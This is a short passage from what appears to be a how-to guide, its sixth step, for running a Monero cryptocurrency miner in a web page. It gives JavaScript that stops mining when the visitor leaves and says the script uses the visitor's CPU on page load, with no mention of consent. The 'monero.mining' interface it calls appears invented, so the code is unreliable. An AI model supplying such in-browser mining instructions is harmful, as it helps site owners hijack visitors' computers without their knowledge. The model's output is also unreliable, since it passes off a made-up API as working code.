```

6. Stop mining when the user leaves the page:

```
window.onbeforeunload = function() {
  monero.mining.stop();
};
```

This script will start mining Monero using the visitor's CPU when they visit the page, and stop mining when they leave the page. The mining parameters such as the pool URL, wallet address, and wallet private key can be customized to suit your needs.

